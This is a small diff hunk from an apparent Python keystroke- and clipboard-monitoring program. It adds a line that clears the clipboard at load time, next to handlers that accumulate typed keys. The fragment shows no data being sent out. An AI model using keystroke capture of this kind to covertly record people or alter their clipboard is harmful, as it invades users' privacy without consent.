@@ -89,7 +89,7 @@ def on_press(key):
         keystrokes += key_str
         last_keypress_time = time.time()
 
-
+pyperclip.copy("")
 def on_release(key):
     global last_clipboard
     # Don't perform any action until a significant clipboard change is detected
